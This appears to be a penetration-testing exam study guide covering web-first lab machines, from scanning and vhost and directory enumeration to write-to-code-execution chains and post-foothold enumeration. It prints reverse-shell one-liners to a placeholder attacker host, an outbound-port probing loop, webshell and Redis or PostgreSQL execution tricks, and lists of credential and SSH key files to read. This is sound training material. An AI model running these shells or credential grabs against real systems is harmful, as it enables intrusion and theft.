Web methodology

The exam-day flow for web-first targets — fingerprint, enumerate, and match against frequency-ranked foothold patterns. Roughly 80% of the lab corpus is web-first, so this is the one to drill.

Exam-day flow for web-first boxes — ~80% of the PG Practice + HTB corpus is web-first. If you drill one thing, drill this. Every step links to the full technique note.

Prime Rules

  1. Fingerprint the exact product + exact version, then CVE search. The version string is the whole game on ~80% of boxes.
  2. Try default credentials before any CVE. admin:admin, admin:password, <appname>:<appname>, root:root.
  3. When you have any file read, first look for creds — configs, DB files, .git/, embedded stores, /proc/self/*.
  4. Every CVE-shaped chain has a manual EXAM-OK path. Never let a banned auto-tool block progress.
  5. Add every discovered vhost to /etc/hosts immediately. WordPress/Rails/many modern apps 301 unknown paths to the canonical vhost URL — you'll waste hours dirbusting the wrong host name.

The Distilled Methodology (Repeatable Playbook)

Phase A — Broad Reconnaissance

1. Full TCP scan first, then -sC -sV on open ports:

sudo nmap -Pn -sC -sV -p- -v <IP> -oN scan.txt

2. Note non-standard ports — PG boxes moved services deliberately as an intended-path signal:

  • PostgreSQL 5437 (Nibbles)
  • SSH 43022 (Hunit), SSH 7742 (Sorcerer)
  • Openfire 9090/9091 (Fired)
  • Mage AI 6789 (Zab)
  • Werkzeug 5000/50000 (WallpaperHub, Hetemit)
  • Gerapy 8000 (Levram)
  • SmarterMail 9998 + 17001 (Algernon)
  • Argus DVR 8080 (DVR4)
  • Nexus 8081 (Billyboss)

Non-defaults are almost always the intended path.

3. For every HTTP-shaped port:

curl -sI http://<IP>:<PORT>/                        # headers — X-Powered-By, X-Version, Server
whatweb http://<IP>:<PORT>/
curl -s http://<IP>:<PORT>/ | grep -Ei 'version|generator|meta name'

# Nmap http-enum — fires common admin path / directory-listing / CMS probes automatically.
# Great "first look" before you commit to a gobuster wordlist.
sudo nmap -p<PORT> --script=http-enum <IP>
# Output pattern: /login.php: Possible admin folder, /db/: BlogWorx Database,
#                 /uploads/: Potentially interesting directory w/ listing

4. If a redirect fires, Location: header may reveal a vhost:

curl -sI http://<IP>/ | grep -i location    # -> e.g. http://bitforge.lab/
echo "<IP> bitforge.lab plan.bitforge.lab" | sudo tee -a /etc/hosts

Phase C — Vhost + Directory + Backup Enumeration

Vhost fuzz (against a known-invalid Host header baseline first):

curl -s -I http://<IP> -H "HOST: defnotvalid.<DOMAIN>" | grep "Content-Length:"
ffuf -w <WORDLIST> -u http://<IP>/ -H "Host:FUZZ.<DOMAIN>" -fs <INVALID_SIZE>
#   -H "Host:FUZZ.<DOMAIN>"    fuzz the Host header (vhost enum)
#   -fs SIZE                    filter out responses of that content-length (baseline)

Directory bruteforce with extensions and WP-catchall filter:

gobuster dir -u http://<VHOST>/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old \
  -b 301,404 --exclude-length <WP_CATCHALL_SIZE> -t 30
#   -x         file extensions to try
#   -b         blacklist status codes
#   --exclude-length   filter out fixed-size WP catch-all 301 responses
#   -t         concurrent threads

feroxbuster -u http://<VHOST>/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old

Always check these paths:

  • /.git/HEAD — leaked repo
  • /.env — Laravel/Node config
  • /robots.txt, /sitemap.xml — surface enumeration
  • /admin, /install, /setup, /wizard — installer left in place
  • /phpinfo.php, /backup
  • /.git/logs/HEAD — commit history
  • /wp-content/uploads/, /uploads/
  • /api/v1/version, /api/rest/
  • /config, /console, /manager/html

Recurring "Write -> RCE" Bridges

Memorise these — every one converts a write primitive into code execution:

  • FTP/other write into Apache/nginx webroot -> drop a .php/.phar webshell (SpiderSociety, dora, Workaholic)
  • SQL INTO OUTFILE -> webshell (Pebbles/ZoneMinder)
  • PostgreSQL COPY ... FROM PROGRAM -> direct RCE (Nibbles)
  • PHP wrappers — data://text/plain;base64, zip://, php://filter via LFI (Snookums, Zipper)
  • Redis — MODULE LOAD .so / SLAVEOF replication / CONFIG SET SSH key drop / cron write (Wombo, Sybaris)
  • Rogue MySQL server <- target client with LOAD DATA LOCAL INFILE (Mantis)
  • Rogue LDAP / SMB — same primitive class (Responder poisoning is BANNED; only analyse-only -A allowed)
  • CMS "config field that shells out" — MantisBT dot_tool, WordPress theme editor, Monstra theme template, Gitea Git Hooks, Zabbix Scripts

Egress + Payload Survival

Iterate outbound ports — bash test:

for p in 80 443 4444 21 53 3000 8000 8080; do
  timeout 3 bash -c "echo > /dev/tcp/<LHOST>/$p" 2>/dev/null && echo "$p OPEN"
done

Common winners on PG: 80, 443, 21, 53 (Roquefort needed port 21 — FTP whitelist).

Payloads that beat quirky exec contexts:

  • cmd/unix/reverse_bash beats an ELF through Runtime.exec() (Fired)
  • Python payload beats bash /dev/tcp through OpenSMTPD's MDA shell (Bratarina)
  • setsid detaches from PHP's max_execution_time (SpiderSociety):

bash setsid bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" & * socat for stateless webshells (Exfiltrated):

bash socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>

Confirm exploit vs payload with ICMP canary:

# Trigger a `ping -c 3 <LHOST>` via the exploit; on attacker:
sudo tcpdump -i tun0 icmp -n

After Foothold — First 30 Seconds (Linux)

Before you upgrade the TTY (Astronaut hides SUID after pty.spawn):

id                                              # groups: disk / docker / lxd / adm / mlocate / staff
sudo -l
find / -perm -4000 -type f 2>/dev/null           # SUID binaries
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_dac_read_search|cap_sys_admin'
cat /etc/crontab

Then the standard PTY upgrade:

python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z on attacker
stty raw -echo; fg
# Enter twice
export TERM=xterm-256color

EXAM-Day Web Checklist

Broad recon (all boxes):

  • [ ] Full TCP scan first (-p-), then -sC -sV on open
  • [ ] For every HTTP port: curl -sI, whatweb, Location: header, view source
  • [ ] Note non-standard ports as intentional signals
  • [ ] Add every discovered vhost to /etc/hosts

Per-web-app:

  • [ ] Version + product ID -> CVE search (searchsploit <product>, Google <product> <version> exploit)
  • [ ] Default creds table above BEFORE any CVE
  • [ ] /.git/HEAD, /.env, /robots.txt, /admin, /install, /setup, /wizard, /phpinfo.php, /backup, /api/v1/version
  • [ ] Dirbuster with --exclude-length for the WP-catchall trap
  • [ ] Look for open registration + first-user-admin (Gitea-shaped apps)
  • [ ] Read every <meta name="generator"> and every error page

When you have a file read:

  • [ ] /etc/passwd (user list)
  • [ ] /proc/self/cwd/*.py, /proc/self/cmdline (source + CLI creds), /proc/self/environ
  • [ ] App-specific configs: wp-config.php, .env, zabbix.conf.php, grafana.db, openfire.script, .htusers.php
  • [ ] /.ssh/id_rsa for any user in /etc/passwd

When you have a shell:

  • [ ] Grab local flag
  • [ ] Password reuse: try every found cred as su / ssh for every user in /etc/passwd
  • [ ] id, sudo -l, SUID find, getcap before PTY upgrade
  • [ ] pspy64 for at least 60s

Under exam time pressure:

  • [ ] Timebox each rabbit hole at 30 min
  • [ ] Rotate egress ports on silent callbacks
  • [ ] Metasploit exploit/aux modules = one target only
  • [ ] SQLMap = banned — use manual extractvalue() (Workaholic pattern)
